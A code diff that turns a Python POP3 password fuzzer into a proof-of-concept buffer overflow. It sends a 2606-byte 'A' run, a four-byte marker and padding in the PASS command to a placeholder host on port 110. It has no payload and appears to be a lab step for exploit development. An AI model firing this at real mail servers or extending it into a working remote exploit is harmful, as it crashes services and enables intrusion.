@@ -1,16 +1,14 @@
 #!/usr/bin/python
 import socket
 
-buffer=["B"]
-count=100
-while len(buffer) <=30:
-    buffer.append("B"*count)
-    count=count+200
 
-for string in buffer:
-    print "\nFuzzing PASS with %s bytes" % len(string)
+
+buffer = "A"*2606 + "B"*4 + "C"*(3500-2606-4)
+
+try:
+    print "\nExploit"
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    connect = s.connect(('10.0.0.22',110)) 
+    connect = s.connect(('a.b.c.d',110)) 
     data = s.recv(1024)
     print data
 
@@ -18,7 +16,7 @@ for string in buffer:
     data = s.recv(1024) # receive reply
     print data # print reply
 
-    s.send('PASS ' + string + '\r\n') # send password "test"
+    s.send('PASS ' + buffer + '\r\n') # send password "test"
     data = s.recv(1024) # receive reply
     print data # print reply
 
@@ -28,3 +26,6 @@ for string in buffer:
 
     s.close() # close socket
     print "\nDone!"
+
+except:
+    print "\nSomething Happen!"
